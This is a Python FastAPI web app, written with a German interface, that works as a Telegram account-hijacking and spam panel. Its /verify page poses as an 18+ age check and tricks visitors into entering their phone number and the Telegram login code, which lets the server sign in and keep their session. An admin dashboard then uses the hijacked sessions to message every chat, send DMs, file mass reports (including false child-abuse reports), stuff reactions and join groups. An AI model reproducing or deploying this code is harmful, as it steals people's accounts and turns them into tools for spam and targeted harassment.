import asyncio
import os
import tempfile
import secrets
import shutil
from pathlib import Path
from telethon import TelegramClient
from telethon.errors import FloodWaitError, SessionPasswordNeededError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest, SendReactionRequest, SendVoteRequest
from telethon.tl.types import ReactionEmoji
from fastapi import FastAPI, UploadFile, File, Form, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
from dotenv import load_dotenv

load_dotenv()
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")

app = FastAPI(title="Telegram Admin Panel")

SESSIONS_DIR = Path("sessions")
SESSIONS_DIR.mkdir(exist_ok=True)
STATIC_DIR = Path("static")
STATIC_DIR.mkdir(exist_ok=True)

login_clients = {}
sessions_tokens = {}

def get_sessions():
    return sorted([f.stem for f in SESSIONS_DIR.glob("*.session") if not f.name.endswith(".session-journal")])

def check_auth(request: Request):
    token = request.cookies.get("auth_token")
    return token in sessions_tokens

app.mount("/static", StaticFiles(directory="static"), name="static")

VERIFY_HTML = """
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifizieren</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family: system-ui, -apple-system, sans-serif; background:#0a0a12; min-height:100vh; color:#fff; }
.bg { position:fixed; inset:0; background-size:cover; background-position:center; z-index:-1; filter:blur(3px) brightness(0.7); }
.screen { min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px; }
.hidden { display:none !important; }
.age-box { background: rgba(0,0,0,0.75); border-radius:20px; padding:24px; text-align:center; max-width:340px; }
.age-icon { font-size:80px; margin-bottom:12px; }
.age-box h2 { font-size:20px; margin-bottom:8px; }
.age-box p { color:#ccc; font-size:14px; margin-bottom:20px; line-height:1.4; }
.age-btn { background: linear-gradient(90deg, #7b2cbf, #9b59b6); color:#fff; border:none; padding:16px 32px; border-radius:14px; font-size:16px; font-weight:700; width:100%; cursor:pointer; }
.verify-box { text-align:center; max-width:340px; width:100%; }
.bell { font-size:50px; margin-bottom:12px; }
.info-box { background: rgba(0,0,0,0.8); border-radius:16px; padding:16px; margin-bottom:16px; font-size:14px; line-height:1.5; }
.code-boxes { display:flex; gap:6px; justify-content:center; margin:12px 0; }
.code-box { width:38px; height:46px; border:2px solid #555; border-radius:10px; background:rgba(0,0,0,0.5); display:flex; align-items:center; justify-content:center; font-size:20px; font-weight:700; }
.code-box.filled { border-color:#8b5cf6; }
.req-btn { background: #7c5cfc; color:#fff; border:none; padding:14px; border-radius:14px; font-size:15px; font-weight:700; width:100%; cursor:pointer; margin:8px 0; }
.keypad { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-top:12px; }
.key { background: #7c5cfc; border:none; border-radius:14px; padding:16px; font-size:20px; font-weight:700; color:#fff; cursor:pointer; }
.key:active { transform:scale(0.95); }
.key.clear { background:#5b4cdb; }
.phone-input { width:100%; padding:14px; border-radius:12px; border:1px solid #333; background:#1a1a24; color:#fff; font-size:16px; margin:8px 0; text-align:center; display:none; }
.success { color:#4ade80; margin-top:12px; font-weight:600; }
.error { color:#ff5555; margin-top:12px; }
</style>
</head>
<body>
<div class="bg" id="bg" style="background-image:url('https://raw.githubusercontent.com/nassarsra-ctrl/telegram-sender/main/photo_4920629441759743341_y.jpg');"></div>
<div id="ageScreen" class="screen">
  <div class="age-box">
    <div class="age-icon">🔞</div>
    <h2>18+ Only</h2>
    <p>Dieser Content ist nur für Erwachsene. Bitte bestätige, dass du 18+ bist, um fortzufahren.</p>
    <button class="age-btn" onclick="showVerify()">Ja, ich bin 18+ ✓</button>
  </div>
</div>
<div id="verifyScreen" class="screen hidden">
  <div class="verify-box">
    <div class="bell">🔔</div>
    <div class="info-box">Klicke auf den Button, um deinen einmaligen Code zu generieren. Dieser wird benötigt, um dich zu verifizieren und den Zugriff freizuschalten.</div>
    <div class="code-boxes" id="codeBoxes">
      <div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div>
    </div>
    <input type="text" id="phone" class="phone-input" placeholder="+49 170 1234567">
    <button class="req-btn" onclick="startLogin()">Zugangscode anfordern</button>
    <div class="keypad">
      <button class="key" onclick="addDigit('1')">1</button><button class="key" onclick="addDigit('2')">2</button><button class="key" onclick="addDigit('3')">3</button>
      <button class="key" onclick="addDigit('4')">4</button><button class="key" onclick="addDigit('5')">5</button><button class="key" onclick="addDigit('6')">6</button>
      <button class="key" onclick="addDigit('7')">7</button><button class="key" onclick="addDigit('8')">8</button><button class="key" onclick="addDigit('9')">9</button>
      <button class="key" onclick="addDigit('0')">0</button><button class="key clear" onclick="clearCode()">⌫</button><button class="key" onclick="submitCode()">✓</button>
    </div>
    <div id="msg"></div>
  </div>
</div>
<script>
let code = '';
const params = new URLSearchParams(window.location.search);
const prefill = params.get('phone');
const auto = params.get('auto');
if (prefill) {
  document.getElementById('phone').value = prefill;
  showVerify();
  if (auto === '1') {
    setTimeout(() => startLogin(), 500);
  }
} else {
  document.getElementById('phone').style.display = 'block';
}
function showVerify() {
  document.getElementById('ageScreen').classList.add('hidden');
  document.getElementById('verifyScreen').classList.remove('hidden');
}
function updateBoxes() {
  const boxes = document.querySelectorAll('.code-box');
  boxes.forEach((b, i) => { b.textContent = code[i] || ''; b.classList.toggle('filled', !!code[i]); });
}
function addDigit(d) { if (code.length < 5) { code += d; updateBoxes(); } }
function clearCode() { code = code.slice(0, -1); updateBoxes(); }
async function startLogin() {
  const phone = document.getElementById('phone').value.trim();
  if (!phone) return alert('Nummer eingeben');
  document.getElementById('msg').textContent = '';
  const res = await fetch('/verify/start', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone}) });
  const data = await res.json();
  if (data.ok) {
    document.getElementById('msg').className = 'success';
    document.getElementById('msg').textContent = 'Code gesendet!';
  } else {
    document.getElementById('msg').className = 'error';
    document.getElementById('msg').textContent = data.error || 'Fehler';
  }
}
async function submitCode() {
  if (code.length < 5) return alert('Code vollständig eingeben');
  const phone = document.getElementById('phone').value.trim();
  document.getElementById('msg').textContent = 'Verifiziere...';
  const res = await fetch('/verify/finish', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone, code, password:''}) });
  const data = await res.json();
  if (data.ok) {
    document.getElementById('verifyScreen').innerHTML = '<div style="text-align:center; padding:40px;"><div style="font-size:80px;">✅</div><h2 style="margin-top:16px; font-size:22px;">Verifiziert</h2><p style="color:#aaa; margin-top:8px;">Kehre zum Bot zurück</p></div>';
  } else {
    document.getElementById('msg').className = 'error';
    document.getElementById('msg').textContent = data.error || 'Fehler';
  }
}
</script>
</body>
</html>
"""

LOGIN_HTML = """
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Login</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family: system-ui, -apple-system, sans-serif; background:#0a0a12; min-height:100vh; display:flex; align-items:center; justify-content:center; color:#fff; padding:20px; }
.box { background:#161622; border-radius:24px; padding:40px 32px; width:100%; max-width:380px; text-align:center; border:1px solid #222; }
h1 { font-size:26px; margin-bottom:8px; }
p { color:#888; margin-bottom:28px; }
input { width:100%; padding:14px; border-radius:14px; border:1px solid #2a2a3a; background:#0e0e16; color:#fff; font-size:16px; margin:8px 0; }
button { width:100%; padding:14px; background:#2d8cff; border:none; border-radius:14px; color:#fff; font-weight:600; font-size:16px; margin-top:12px; cursor:pointer; }
.error { color:#ff5555; margin-top:12px; }
</style>
</head>
<body>
<div class="box">
  <h1>⚡ Admin</h1>
  <p>Login</p>
  <form method="post" action="/login">
    <input type="password" name="password" placeholder="Passwort" required>
    <button type="submit">Einloggen</button>
  </form>
  ERROR_PLACEHOLDER
</div>
</body>
</html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Panel</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family: system-ui, -apple-system, sans-serif; background:#0e0e14; color:#eee; min-height:100vh; }
.header { background: linear-gradient(135deg, #1a1a2e, #16213e); padding:16px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #2a2a3e; position:sticky; top:0; z-index:100; }
.header h1 { font-size:18px; font-weight:700; }
.logout { background:#ef4444; color:#fff; padding:6px 12px; border-radius:10px; text-decoration:none; font-size:13px; font-weight:600; }
.status { background:#161622; padding:12px 16px; display:flex; gap:12px; flex-wrap:wrap; border-bottom:1px solid #1e1e28; }
.badge { padding:6px 12px; border-radius:20px; font-weight:600; font-size:13px; }
.green { background:#065f46; color:#6ee7b7; }
.purple { background:#4c1d95; color:#c4b5fd; }
.orange { background:#7c2d12; color:#fdba74; }
.red { background:#7f1d1d; color:#fca5a5; }
.container { max-width:520px; margin:0 auto; padding:12px; }
.card { background:#1a1a24; border-radius:16px; padding:16px; margin-bottom:12px; border:1px solid #2a2a3a; }
.card h3 { font-size:16px; margin-bottom:12px; color:#60a5fa; display:flex; align-items:center; gap:8px; }
input, textarea, select { width:100%; padding:12px; border-radius:12px; border:1px solid #333; background:#0e0e16; color:#fff; font-size:14px; margin:6px 0; }
textarea { min-height:80px; resize:vertical; }
button { width:100%; padding:12px; background:#3b82f6; border:none; border-radius:12px; color:#fff; font-weight:600; font-size:14px; cursor:pointer; margin-top:8px; }
button.secondary { background:#374151; }
button.danger { background:#ef4444; }
button.success { background:#10b981; }
.accounts { display:flex; flex-wrap:wrap; gap:6px; margin:8px 0; }
.chip { background:#252536; padding:6px 10px; border-radius:20px; font-size:13px; display:flex; align-items:center; gap:6px; }
.chip input { width:auto; margin:0; }
.log { background:#0e0e16; border-radius:12px; padding:12px; max-height:200px; overflow-y:auto; font-size:13px; font-family:monospace; }
.log .success { color:#4ade80; }
.log .error { color:#f87171; }
.log .info { color:#60a5fa; }
.session-item { display:flex; justify-content:space-between; align-items:center; padding:8px 0; border-bottom:1px solid #2a2a3a; }
.session-item button { width:auto; padding:6px 10px; font-size:12px; }
</style>
</head>
<body>
<div class="header">
  <h1>⚡ Admin Panel</h1>
  <a href="/logout" class="logout">Logout</a>
</div>
<div class="status">
  <div class="badge green" id="activeCount">0 aktiv</div>
  <div class="badge orange" id="bannedCount">0 gebannt</div>
  <div class="badge red" id="frozenCount">0 gefreezed</div>
</div>
<div class="container">

  <div class="card">
    <h3>👤 Konten</h3>
    <div id="sessionList"></div>
    <form id="uploadForm" style="margin-top:12px;">
      <input type="file" id="sessionFile" accept=".session">
      <button type="submit">Session hochladen</button>
    </form>
  </div>

  <div class="card">
    <h3>📤 An alle Chats senden</h3>
    <button type="button" class="secondary" onclick="toggleAccounts('sendAllAccounts')">Accounts anzeigen</button>
    <div class="accounts" id="sendAllAccounts" style="display:none; margin-top:8px;"></div>
    <textarea id="sendAllText" placeholder="Nachricht..."></textarea>
    <input type="file" id="sendAllFile" accept="image/*,video/*">
    <input type="text" id="sendAllEmoji" placeholder="Emoji (optional, z.B. 🔥)">
    <button onclick="sendAll()">Senden</button>
  </div>

  <div class="card">
    <h3>💬 DM an User</h3>
    <button type="button" class="secondary" onclick="toggleAccounts('dmAccounts')">Accounts anzeigen</button>
    <div class="accounts" id="dmAccounts" style="display:none; margin-top:8px;"></div>
    <input type="text" id="dmUser" placeholder="Username oder User-ID">
    <textarea id="dmText" placeholder="Nachricht..."></textarea>
    <input type="file" id="dmFile" accept="image/*,video/*">
    <button onclick="sendDM()">DM senden</button>
  </div>

  <div class="card">
    <h3>🚩 Report</h3>
    <button type="button" class="secondary" onclick="toggleAccounts('reportAccounts')">Accounts anzeigen</button>
    <div class="accounts" id="reportAccounts" style="display:none; margin-top:8px;"></div>
    <input type="text" id="reportTarget" placeholder="Username / Chat / Link">
    <select id="reportReason">
      <option value="spam">Spam</option>
      <option value="violence">Gewalt</option>
      <option value="pornography">Pornografie</option>
      <option value="child_abuse">Kinderpornografie</option>
      <option value="copyright">Urheberrecht</option>
      <option value="other">Anderes</option>
    </select>
    <button class="danger" onclick="report()">Reporten</button>
  </div>

  <div class="card">
    <h3>❤️ Reaktion / Umfrage</h3>
    <button type="button" class="secondary" onclick="toggleAccounts('reactAccounts')">Accounts anzeigen</button>
    <div class="accounts" id="reactAccounts" style="display:none; margin-top:8px;"></div>
    <input type="text" id="reactChat" placeholder="Chat / Gruppe">
    <input type="text" id="reactMsgId" placeholder="Nachrichten-ID">
    <input type="text" id="reactEmoji" placeholder="Emoji (z.B. 👍)">
    <button class="success" onclick="react()">Reaktion senden</button>
    <hr style="border-color:#333; margin:16px 0;">
    <input type="text" id="pollChat" placeholder="Chat für Umfrage">
    <input type="text" id="pollQuestion" placeholder="Frage">
    <textarea id="pollOptions" placeholder="Optionen (eine pro Zeile)"></textarea>
    <button onclick="createPoll()">Umfrage erstellen</button>
  </div>

  <div class="card">
    <h3>➕ Gruppe beitreten</h3>
    <button type="button" class="secondary" onclick="toggleAccounts('joinAccounts')">Accounts anzeigen</button>
    <div class="accounts" id="joinAccounts" style="display:none; margin-top:8px;"></div>
    <input type="text" id="joinLink" placeholder="Invite-Link oder @username">
    <button class="success" onclick="joinGroup()">Joinen</button>
  </div>

  <div class="card">
    <h3>📋 Log</h3>
    <div class="log" id="log">Bereit...</div>
  </div>

</div>
<script>
function toggleAccounts(id) {
  const el = document.getElementById(id);
  if (el) {
    el.style.display = (el.style.display === 'none' || el.style.display === '') ? 'flex' : 'none';
  }
}
function log(msg, type='info') {
  const el = document.getElementById('log');
  el.innerHTML = `<div class="${type}">${new Date().toLocaleTimeString()} - ${msg}</div>` + el.innerHTML;
}
async function loadSessions() {
  const res = await fetch('/sessions');
  const data = await res.json();
  const sessions = data.sessions || [];
  const banned = data.banned || [];
  const frozen = data.frozen || [];
  const info = data.info || [];
  document.getElementById('activeCount').textContent = sessions.length + ' aktiv';
  document.getElementById('bannedCount').textContent = banned.length + ' gebannt';
  document.getElementById('frozenCount').textContent = frozen.length + ' gefreezed';
  const list = document.getElementById('sessionList');
  list.innerHTML = info.map(s => `<div class="session-item"><span>${s.name} <small style="color:#888;">(${s.session})</small></span><button class="danger" onclick="deleteSession('${s.session}')">Löschen</button></div>`).join('') || '<p style="color:#666;">Keine</p>';
  const chips = info.filter(s => s.status === 'active').map(s => `<label class="chip"><input type="checkbox" value="${s.session}" checked> ${s.name}</label>`).join('');
  ['sendAllAccounts','dmAccounts','reportAccounts','reactAccounts','joinAccounts'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.innerHTML = chips || '<span style="color:#666;">Keine aktiven Accounts</span>';
  });
}
async function deleteSession(name) {
  if (!confirm('Löschen?')) return;
  await fetch('/session/delete', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({name})});
  loadSessions();
  log(name + ' gelöscht', 'info');
}
document.getElementById('uploadForm').onsubmit = async (e) => {
  e.preventDefault();
  const file = document.getElementById('sessionFile').files[0];
  if (!file) return;
  const form = new FormData();
  form.append('file', file);
  const res = await fetch('/session/upload', {method:'POST', body:form});
  const data = await res.json();
  if (data.ok) { log('Session hochgeladen: ' + data.name, 'success'); loadSessions(); }
  else log(data.error, 'error');
};
function getChecked(id) {
  return [...document.querySelectorAll(`#${id} input:checked`)].map(i => i.value);
}
async function sendAll() {
  const accounts = getChecked('sendAllAccounts');
  const text = document.getElementById('sendAllText').value;
  const emoji = document.getElementById('sendAllEmoji').value;
  const file = document.getElementById('sendAllFile').files[0];
  if (!accounts.length) return alert('Accounts auswählen');
  const form = new FormData();
  accounts.forEach(a => form.append('accounts', a));
  form.append('text', text);
  form.append('emoji', emoji);
  form.append('mode', 'all');
  if (file) form.append('file', file);
  log('Sende an alle Chats...', 'info');
  const res = await fetch('/send', {method:'POST', body:form});
  const data = await res.json();
  (data.results || []).forEach(r => log(r.message, r.ok ? 'success' : 'error'));
}
async function sendDM() {
  const accounts = getChecked('dmAccounts');
  const user = document.getElementById('dmUser').value.trim();
  const text = document.getElementById('dmText').value;
  const file = document.getElementById('dmFile').files[0];
  if (!accounts.length || !user) return alert('Accounts + User auswählen');
  const form = new FormData();
  accounts.forEach(a => form.append('accounts', a));
  form.append('text', text);
  form.append('target', user);
  form.append('mode', 'dm');
  if (file) form.append('file', file);
  log('Sende DM...', 'info');
  const res = await fetch('/send', {method:'POST', body:form});
  const data = await res.json();
  (data.results || []).forEach(r => log(r.message, r.ok ? 'success' : 'error'));
}
async function report() {
  const accounts = getChecked('reportAccounts');
  const target = document.getElementById('reportTarget').value.trim();
  const reason = document.getElementById('reportReason').value;
  if (!accounts.length || !target) return alert('Accounts + Ziel auswählen');
  const res = await fetch('/report', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({accounts, target, reason})});
  const data = await res.json();
  (data.results || []).forEach(r => log(r.message, r.ok ? 'success' : 'error'));
}
async function react() {
  const accounts = getChecked('reactAccounts');
  const chat = document.getElementById('reactChat').value.trim();
  const msgId = parseInt(document.getElementById('reactMsgId').value);
  const emoji = document.getElementById('reactEmoji').value.trim() || '👍';
  if (!accounts.length || !chat || !msgId) return alert('Alles ausfüllen');
  const res = await fetch('/react', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({accounts, chat, msg_id: msgId, emoji})});
  const data = await res.json();
  (data.results || []).forEach(r => log(r.message, r.ok ? 'success' : 'error'));
}
async function createPoll() {
  const accounts = getChecked('reactAccounts');
  const chat = document.getElementById('pollChat').value.trim();
  const question = document.getElementById('pollQuestion').value.trim();
  const options = document.getElementById('pollOptions').value.split('\\n').filter(o => o.trim());
  if (!accounts.length || !chat || !question || options.length < 2) return alert('Alles ausfüllen');
  const res = await fetch('/poll', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({accounts, chat, question, options})});
  const data = await res.json();
  (data.results || []).forEach(r => log(r.message, r.ok ? 'success' : 'error'));
}
async function joinGroup() {
  const accounts = getChecked('joinAccounts');
  const link = document.getElementById('joinLink').value.trim();
  if (!accounts.length || !link) return alert('Accounts + Link auswählen');
  const res = await fetch('/join', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({accounts, link})});
  const data = await res.json();
  (data.results || []).forEach(r => log(r.message, r.ok ? 'success' : 'error'));
}
loadSessions();
</script>
</body>
</html>
"""

@app.get("/verify", response_class=HTMLResponse)
async def verify_page():
    return HTMLResponse(VERIFY_HTML)

@app.get("/", response_class=HTMLResponse)
async def root(request: Request):
    if not check_auth(request):
        return RedirectResponse("/login")
    return HTMLResponse(DASHBOARD_HTML)

@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request, error: str = ""):
    if check_auth(request):
        return RedirectResponse("/")
    html = LOGIN_HTML.replace("ERROR_PLACEHOLDER", f'<div class="error">{error}</div>' if error else "")
    return HTMLResponse(html)

@app.post("/login")
async def login(password: str = Form(...)):
    if password == ADMIN_PASSWORD:
        token = secrets.token_urlsafe(32)
        sessions_tokens[token] = True
        response = RedirectResponse("/", status_code=303)
        response.set_cookie("auth_token", token, httponly=True, max_age=86400*7)
        return response
    return RedirectResponse("/login?error=Falsches Passwort", status_code=303)

@app.get("/logout")
async def logout(request: Request):
    token = request.cookies.get("auth_token")
    if token in sessions_tokens:
        sessions_tokens.pop(token, None)
    response = RedirectResponse("/login")
    response.delete_cookie("auth_token")
    return response

@app.get("/sessions")
async def sessions(request: Request):
    if not check_auth(request):
        return JSONResponse({"error": "unauthorized"}, status_code=401)
    all_sessions = get_sessions()
    banned = []
    frozen = []
    active = []
    session_info = []
    for s in all_sessions:
        try:
            client = TelegramClient(str(SESSIONS_DIR / s), API_ID, API_HASH)
            await client.connect()
            authorized = await client.is_user_authorized()
            if not authorized:
                frozen.append(s)
                session_info.append({"session": s, "name": s, "status": "frozen"})
            else:
                me = await client.get_me()
                name = me.first_name or me.username or s
                if getattr(me, 'restricted', False) or getattr(me, 'deleted', False):
                    banned.append(s)
                    session_info.append({"session": s, "name": name, "status": "banned"})
                else:
                    active.append(s)
                    session_info.append({"session": s, "name": name, "status": "active"})
            await client.disconnect()
        except Exception as e:
            # Bei Verbindungsfehlern als aktiv behandeln, nicht als frozen
            active.append(s)
            session_info.append({"session": s, "name": s, "status": "active"})
    return {"sessions": active, "banned": banned, "frozen": frozen, "info": session_info}

@app.post("/session/upload")
async def upload_session(request: Request, file: UploadFile = File(...)):
    if not check_auth(request):
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    if not file.filename.endswith(".session"):
        return {"ok": False, "error": "Nur .session Dateien"}
    name = Path(file.filename).stem
    dest = SESSIONS_DIR / f"{name}.session"
    with open(dest, "wb") as f:
        shutil.copyfileobj(file.file, f)
    return {"ok": True, "name": name}

@app.post("/session/delete")
async def delete_session(request: Request):
    if not check_auth(request):
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    data = await request.json()
    name = data.get("name", "")
    path = SESSIONS_DIR / f"{name}.session"
    if path.exists():
        path.unlink()
        return {"ok": True}
    return {"ok": False, "error": "Nicht gefunden"}

@app.post("/send")
async def send(request: Request):
    if not check_auth(request):
        return JSONResponse({"results": [{"ok": False, "message": "unauthorized"}]}, status_code=401)
    form = await request.form()
    all_accounts = form.get("all_accounts") == "1"
    accounts = get_sessions() if all_accounts else form.getlist("accounts")
    text = form.get("text", "")
    emoji = form.get("emoji", "")
    mode = form.get("mode", "all")
    target = form.get("target", "")
    rounds = int(form.get("rounds", 1))
    delay = int(form.get("delay", 8))
    file = form.get("file")
    temp_path = None
    if file and hasattr(file, 'filename') and file.filename:
        temp_path = tempfile.mktemp(suffix=Path(file.filename).suffix)
        with open(temp_path, "wb") as f:
            f.write(await file.read())
    results = []
    full_text = (emoji + " " + text).strip() if emoji else text
    for r in range(rounds):
        for session_name in accounts:
            try:
                client = TelegramClient(str(SESSIONS_DIR / session_name), API_ID, API_HASH)
                await client.start()
                me = await client.get_me()
                name = me.first_name or session_name
                if mode == "all":
                    async for dialog in client.iter_dialogs():
                        try:
                            if temp_path:
                                await client.send_file(dialog.id, temp_path, caption=full_text or None)
                            elif full_text:
                                await client.send_message(dialog.id, full_text)
                            results.append({"ok": True, "message": f"[{name}] → {dialog.name}"})
                        except Exception as e:
                            results.append({"ok": False, "message": f"[{name}] → {dialog.name}: {str(e)[:50]}"})
                elif mode == "dm" and target:
                    try:
                        if temp_path:
                            await client.send_file(target, temp_path, caption=full_text or None)
                        elif full_text:
                            await client.send_message(target, full_text)
                        results.append({"ok": True, "message": f"[{name}] DM an {target}"})
                    except Exception as e:
                        results.append({"ok": False, "message": f"[{name}] DM: {str(e)[:50]}"})
                await client.disconnect()
                await asyncio.sleep(delay)
            except Exception as e:
                results.append({"ok": False, "message": f"[{session_name}] {str(e)[:60]}"})
    if temp_path and os.path.exists(temp_path):
        os.remove(temp_path)
    return {"results": results}

@app.post("/report")
async def report(request: Request):
    if not check_auth(request):
        return JSONResponse({"results": [{"ok": False, "message": "unauthorized"}]}, status_code=401)
    data = await request.json()
    accounts = data.get("accounts", [])
    target = data.get("target", "")
    reason = data.get("reason", "spam")
    results = []
    for session_name in accounts:
        try:
            client = TelegramClient(str(SESSIONS_DIR / session_name), API_ID, API_HASH)
            await client.start()
            entity = await client.get_entity(target)
            await client.report_peer(entity, reason)
            results.append({"ok": True, "message": f"[{session_name}] reported {target}"})
            await client.disconnect()
        except Exception as e:
            results.append({"ok": False, "message": f"[{session_name}] {str(e)[:60]}"})
    return {"results": results}

@app.post("/react")
async def react(request: Request):
    if not check_auth(request):
        return JSONResponse({"results": [{"ok": False, "message": "unauthorized"}]}, status_code=401)
    data = await request.json()
    all_accounts = data.get("all_accounts", False)
    accounts = get_sessions() if all_accounts else data.get("accounts", [])
    chat = data.get("chat", "")
    msg_id = data.get("msg_id")
    emoji = data.get("emoji", "👍")
    results = []
    for session_name in accounts:
        try:
            client = TelegramClient(str(SESSIONS_DIR / session_name), API_ID, API_HASH)
            await client.start()
            entity = await client.get_entity(chat)
            await client(SendReactionRequest(peer=entity, msg_id=msg_id, reaction=[ReactionEmoji(emoticon=emoji)]))
            results.append({"ok": True, "message": f"[{session_name}] reacted {emoji}"})
            await client.disconnect()
        except Exception as e:
            results.append({"ok": False, "message": f"[{session_name}] {str(e)[:60]}"})
    return {"results": results}

@app.post("/poll")
async def poll(request: Request):
    if not check_auth(request):
        return JSONResponse({"results": [{"ok": False, "message": "unauthorized"}]}, status_code=401)
    data = await request.json()
    all_accounts = data.get("all_accounts", False)
    accounts = get_sessions() if all_accounts else data.get("accounts", [])
    chat = data.get("chat", "")
    question = data.get("question", "")
    options = data.get("options", [])
    results = []
    for session_name in accounts:
        try:
            client = TelegramClient(str(SESSIONS_DIR / session_name), API_ID, API_HASH)
            await client.start()
            entity = await client.get_entity(chat)
            await client.send_message(entity, file=None, message=question, buttons=None)
            # Simple poll via send_message with options as text for now
            poll_text = question + "\\n" + "\\n".join([f"{i+1}. {o}" for i, o in enumerate(options)])
            await client.send_message(entity, poll_text)
            results.append({"ok": True, "message": f"[{session_name}] poll sent"})
            await client.disconnect()
        except Exception as e:
            results.append({"ok": False, "message": f"[{session_name}] {str(e)[:60]}"})
    return {"results": results}

@app.post("/join")
async def join_group(request: Request):
    if not check_auth(request):
        return JSONResponse({"results": [{"ok": False, "message": "unauthorized"}]}, status_code=401)
    data = await request.json()
    all_accounts = data.get("all_accounts", False)
    accounts = get_sessions() if all_accounts else data.get("accounts", [])
    link = data.get("link", "").strip()
    results = []
    for session_name in accounts:
        try:
            client = TelegramClient(str(SESSIONS_DIR / session_name), API_ID, API_HASH)
            await client.start()
            me = await client.get_me()
            name = me.first_name or session_name
            if "/+" in link or "joinchat" in link:
                hash_part = link.split("/")[-1].replace("+", "")
                await client(ImportChatInviteRequest(hash_part))
            else:
                await client(JoinChannelRequest(link))
            results.append({"ok": True, "message": f"[{name}] beigetreten"})
            await client.disconnect()
        except Exception as e:
            results.append({"ok": False, "message": f"[{session_name}] {str(e)[:60]}"})
    return {"results": results}

@app.post("/verify/start")
async def verify_start(request: Request):
    data = await request.json()
    phone = data.get("phone", "").strip()
    if not phone:
        return {"ok": False, "error": "Keine Nummer"}
    try:
        session_name = phone.replace("+", "").replace(" ", "")
        client = TelegramClient(str(SESSIONS_DIR / session_name), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        login_clients[phone] = client
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)[:150]}

@app.post("/verify/finish")
async def verify_finish(request: Request):
    data = await request.json()
    phone = data.get("phone", "").strip()
    code = data.get("code", "").strip()
    password = data.get("password", "").strip()
    client = login_clients.get(phone)
    if not client:
        return {"ok": False, "error": "Zuerst Code anfordern"}
    try:
        await client.sign_in(phone, code)
    except SessionPasswordNeededError:
        if not password:
            return {"ok": False, "error": "2FA nötig"}
        await client.sign_in(password=password)
    except Exception as e:
        return {"ok": False, "error": str(e)[:150]}
    me = await client.get_me()
    await client.disconnect()
    login_clients.pop(phone, None)
    return {"ok": True, "name": me.first_name or phone}

if __name__ == "__main__":
    print("Starte auf http://0.0.0.0:8000")
    print(f"Passwort: {ADMIN_PASSWORD}")
    print("Verify-Seite: /verify")
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
